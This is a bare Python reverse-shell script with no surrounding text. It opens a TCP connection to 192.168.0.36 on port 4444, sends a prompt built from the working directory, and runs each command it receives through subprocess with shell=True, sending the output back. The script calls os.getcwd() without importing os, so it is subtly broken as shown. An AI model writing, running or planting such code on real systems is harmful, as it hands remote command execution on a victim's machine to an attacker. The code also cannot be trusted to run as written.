import socket
import subprocess

addr = '192.168.0.36'
port = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((addr, port))
msg = os.getcwd() + ' > '
while True:
    s.send(msg.encode())
    message_recive = s.recv(4096).decode()
    if len(message_recive) > 0:
        proc = subprocess.run(message_recive, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
        proc_send = proc.stdout
        s.send(proc_send)


s.close()
